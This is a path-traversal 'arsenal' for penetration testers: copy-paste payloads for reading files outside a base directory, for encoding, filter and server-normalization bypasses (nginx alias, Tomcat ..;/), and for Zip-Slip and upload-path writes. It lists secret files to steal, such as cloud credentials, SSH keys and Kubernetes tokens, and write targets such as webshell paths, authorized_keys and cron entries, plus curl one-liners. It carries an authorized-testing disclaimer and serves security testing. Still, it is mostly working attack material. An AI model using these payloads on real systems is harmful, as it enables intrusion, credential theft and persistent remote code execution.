# Path / Directory Traversal — Arsenal (copy-paste payloads)

> Companion to `PATH_TRAVERSAL_TESTING_GUIDE.md`. This kit owns **read-without-include**, **file WRITE (Zip-Slip /
> upload-path / save)**, and **server-normalization** traversal. If the sink **includes/executes** the file → use the
> **`LFI/` kit** (wrapper/log-poison/filter-chain RCE). Send `../` raw with `curl --path-as-is` or Burp (browsers/curl
> collapse it otherwise). Prove **impact** (secret/cross-user read, or out-of-dir write), not a same-dir path change.
> **Authorized testing only; benign marker files; never overwrite real files.**

---

## 0. Parameter / source name-set

```
file  path  download  doc  document  name  filename  fname  page  template  report  img  image  attachment
key  resource  dir  folder  location  src  target  dest  destination  out  output  save  export  log  upload  url
# path segments:  /files/<x>  /download/<x>  /static/<x>  /media/<x>  /api/*/files/<x>
# upload/archive:  multipart filename="...",  JSON {"path"/"dest"/"name":...},  ZIP/TAR entry names
```

---

## 1. Core traversal (read) — Linux

```
../etc/passwd
../../etc/passwd
../../../../etc/passwd
../../../../../../../../etc/passwd        (over-traverse: extra ../ are harmless at /)
/etc/passwd                                (absolute — CWE-36; skips depth guessing)
....//....//....//etc/passwd               (non-recursive strip bypass — collapses to ../)
..././..././..././etc/passwd
/./././././etc/passwd
file:///etc/passwd
```

## 2. Core traversal (read) — Windows

```
..\..\..\windows\win.ini
..\..\..\..\..\..\windows\win.ini
....\\....\\....\\windows\win.ini
C:\windows\win.ini                          (drive-absolute)
C:\windows\system32\drivers\etc\hosts
\\?\C:\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
file.aspx::$DATA                            (Alternate Data Stream — read .NET source)
web.config
..\..\inetpub\wwwroot\web.config
```

## 3. Encoding & filter bypass

```
..%2f..%2f..%2fetc%2fpasswd                 (URL-encoded /)
..%5c..%5c..%5cwin.ini                      (URL-encoded \)
%2e%2e%2f%2e%2e%2fetc%2fpasswd              (encoded dots + slash)
%252e%252e%252fetc%252fpasswd               (double-encoded — beats decode-once/WAF)
..%255c..%255cwin.ini
..%c0%af..%c0%afetc%c0%afpasswd             (overlong UTF-8 / — legacy IIS/Unicode)
..%c1%9c..%c1%9cwin.ini                     (overlong \ )
%c0%ae%c0%ae%c0%afetc%c0%afpasswd
%uff0e%uff0e%u2215etc%u2215passwd           (unicode fullwidth dot / division slash)
..%00/etc/passwd                            (null — legacy)
....//                                       (strip-and-reform)
..;/                                         (semicolon path segment — Java/Tomcat)
```

## 4. Prefix / suffix / allowlist bypass

```
# forced base dir prepended (open(BASE + input)) — just climb out:
../../../../../../etc/passwd
# forced suffix appended (input + ".png"/".pdf"):
../../etc/passwd%00.png                      (legacy null)
../../etc/passwd%00
../../etc/passwd/././././././...             (legacy PHP path truncation — appended ext falls off; pad to 4096+)
# target a file that already ends with the forced extension:
../../../var/log/app.log        (if suffix is .log)     ../../../backup/db.bak   (if .bak)
# allowlist "must contain allowed name" — traverse FROM it:
allowed.txt/../../../../etc/passwd
/var/www/allowed/../../../../etc/passwd
# "must start with /base":
/base/../../../../etc/passwd
```

## 5. Server & framework normalization (test on /static, /assets, etc.)

```
# nginx alias off-by-slash (location /static { alias /path/static/; }  — NOTE missing trailing slash on location):
/static../
/static../../etc/passwd
/assets../../../etc/passwd
/img../  /media../  /css../  /js../
# Tomcat / Java servlet — semicolon path params reach WEB-INF:
/app/..;/..;/WEB-INF/web.xml
/..;/..;/WEB-INF/classes/application.properties
/;/../WEB-INF/web.xml
# encoded slash not decoded by proxy but decoded by app:
/api/%2e%2e%2f%2e%2e%2fWEB-INF/web.xml
/%2e%2e/%2e%2e/etc/passwd
# .git / backups via server-normalization (source + secrets):
/static../.git/config
/static../.env
/static../../config/database.yml
```

## 6. High-value READ targets (climb here from /etc/passwd — guide §10)

```
Linux app secrets/source:
  .env  config.php  wp-config.php  settings.py  application.yml  application.properties  appsettings.json
  /var/www/<app>/...(source)   database.yml   secrets.yml   docker-compose.yml   .git/config   id_rsa
  ~/.aws/credentials   ~/.ssh/id_rsa   /root/.ssh/id_rsa   /proc/self/environ   /proc/self/cmdline
  /var/run/secrets/kubernetes.io/serviceaccount/token   /run/secrets/*   *.sqlite   *.bak  *.old
Windows:
  web.config   appsettings.json   C:\inetpub\...\web.config   unattend.xml   sysprep.inf
  <app>\connectionStrings.config   IIS logs   .aspx source via ::$DATA
```

## 7. WRITE — Zip-Slip archive entry names (guide §12)

```
# a benign entry that traverses OUT of the extraction dir (use poc/zipslip_build.py):
../../../../tmp/pt-poc-<rand>.txt                        (safe marker — prove the escape first)
..\..\..\..\Windows\Temp\pt-poc-<rand>.txt              (Windows)
# escalation targets (only on your OWN instance / describe, don't drop live shells on prod):
../../../../var/www/html/pt-<rand>.php
../../../../var/lib/tomcat/webapps/ROOT/pt-<rand>.jsp
../../../../home/<user>/.ssh/authorized_keys            (append your key — RCE/persistence)
../../../../etc/cron.d/pt-<rand>
# tar-specific: an entry that is a SYMLINK to /etc or an ABSOLUTE path (/etc/cron.d/x).
```

## 8. WRITE — upload filename / dest path (guide §13)

```
# multipart filename with traversal:
Content-Disposition: form-data; name="file"; filename="../../../../var/www/html/pt-<rand>.php"
# JSON/body dest fields:
{"filename":"../../../public/pt-<rand>.php"}
{"path":"../../webroot/pt-<rand>.jsp"}
{"dest":"../../../../home/user/.ssh/authorized_keys"}
?savepath=../../../var/www/html/pt-<rand>.php
# overwrite an existing served/config file (often more reliable than a new drop):
filename="../../../../app/static/main.js"     (overwrite trusted JS → client-side RCE/XSS on all users)
```

## 9. Language foot-guns (absolute path REPLACES the base — no ../ needed)

```
# Python os.path.join(base, user)  and  .NET Path.Combine(base, user):
#   if `user` is ABSOLUTE, the base dir is DISCARDED:
/etc/passwd            (Python: os.path.join('/var/data','/etc/passwd') == '/etc/passwd')
C:\windows\win.ini     (.NET: Path.Combine(@"C:\data", @"C:\windows\win.ini") == the latter)
# so ALWAYS try a plain absolute path on Python/.NET/Java targets before bothering with ../
```

## 10. One-liners (quick confirm)

```bash
# read (MUST use --path-as-is so ../ isn't collapsed):
curl --path-as-is -s "https://target/download?file=../../../../../../etc/passwd" | head
curl --path-as-is -s "https://target/static../../../../etc/passwd" | head           # nginx alias
curl --path-as-is -s "https://target/app/..;/..;/WEB-INF/web.xml"                    # Tomcat

# this kit's tooling:
python3 poc/pt_read_fuzz.py -u "https://target/download?file=FUZZ" --read /etc/passwd --marker "root:x:0:0"
python3 poc/zipslip_build.py --out evil.zip --name "../../../../tmp/pt-poc-9f3.txt" --content "benign-poc"
python3 poc/write_probe.py -u https://target/upload --field filename --marker pt-9f3
```

---

## 11. Confirm-it checklist (don't submit before this)

```
□ You ESCAPED the base dir (reached a file OUTSIDE the intended directory) — not a same-dir path change.
□ You sent ../ RAW (curl --path-as-is / Burp), not collapsed client-side.
□ READ: you reached SECRETS/SOURCE/other-users' files — not just /etc/passwd (which is Medium).
□ WRITE: a BENIGN marker provably landed OUTSIDE the base dir (path shown); escalation described, not destructively done.
□ You classified the sink (read/serve vs write). An INCLUDE/EXECUTE sink → LFI kit, not here.
□ Server-normalization: you cited the exact server/framework (nginx alias / Tomcat ..;/ / IIS) + version if known.
□ Benign markers only; no real file overwritten/deleted; secrets/PII redacted.
```
